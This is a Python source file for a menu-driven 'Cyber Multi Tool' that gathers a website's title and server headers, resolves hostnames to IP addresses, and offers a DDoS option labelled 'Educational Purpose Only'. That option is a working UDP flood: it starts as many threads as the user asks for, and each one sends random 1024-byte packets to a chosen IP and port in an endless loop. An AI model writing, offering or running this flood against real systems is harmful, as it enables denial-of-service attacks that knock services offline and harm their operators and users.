import os
import requests
from bs4 import BeautifulSoup
import socket
import threading

def info_gathering():
    site = input("Enter website URL (without https://): ")
    url = f"https://{site}"
    try:
        res = requests.get(url)
        soup = BeautifulSoup(res.text, 'html.parser')
        print("Welcome to the Cyber Multi Tool!")
        print(f"[+] Title: {soup.title.string if soup.title else 'N/A'}")
        print(f"[+] Server Header: {res.headers.get('Server', 'N/A')}")
        print(f"[+] X-Powered-By: {res.headers.get('X-Powered-By', 'N/A')}")
    except Exception as e:
        print(f"[!] Error: {e}")

def ip_tracker():
    host = input("Enter hostname or website URL: ")
    try:
        ip = socket.gethostbyname(host)
        print(f"[+] IP Address of {host} is {ip}")
    except Exception as e:
        print(f"[!] Error: {e}")

def ddos_attack():
    ip = input("Enter target IP: ")
    try:
        port = int(input("Enter target port: "))
        threads = int(input("Number of threads: "))
    except ValueError:
        print("[!] Invalid port or thread number!")
        return

    def attack():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_data = os.urandom(1024)
        while True:
            try:
                s.sendto(bytes_data, (ip, port))
                print(f"[+] Sent packet to {ip}:{port}")
            except Exception as e:
                print(f"[!] Error: {e}")
                break

    for i in range(threads):
        thread = threading.Thread(target=attack)
        thread.start()

def main():
    while True:
        print("\nCyber Multi Tool Menu:")
        print("1. Info Gathering")
        print("2. IP Tracker")
        print("3. DDoS (Educational Purpose Only)")
        print("4. Exit")

        choice = input("Enter your choice: ")
        if choice == "1":
            info_gathering()
        elif choice == "2":
            ip_tracker()
        elif choice == "3":
            ddos_attack()
        elif choice == "4":
            break
        else:
            print("Invalid choice! Try again.")

if __name__ == "__main__":
    main()
